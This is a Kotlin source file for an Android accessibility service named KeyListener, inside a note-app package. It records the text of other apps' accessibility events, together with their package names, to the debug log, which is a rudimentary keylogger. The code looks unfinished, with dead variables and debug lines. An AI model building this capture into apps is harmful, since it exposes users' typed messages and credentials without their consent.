package com.example.cleanarchitecturenoteapp

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class KeyListener : AccessibilityService() {
    var foregroundApp = ""
    var lastMsg = ""
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType: Int = event.getEventType()
        Log.d("eventType", "$eventType")
        Log.d("hi", "hi")
        val eventText: String? = null
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {}
        }
        val currApp: String = event.getPackageName().toString()
        if (foregroundApp == currApp || foregroundApp.isEmpty()) {
            lastMsg = event.getText().toString()
            Log.d("Pre", "$currApp  :  $lastMsg")
        } else {
            Log.d("Final ", "$foregroundApp :  $lastMsg")
        }
        foregroundApp = currApp
        lastMsg = event.getText().toString()
    }

    override fun onInterrupt() {}
}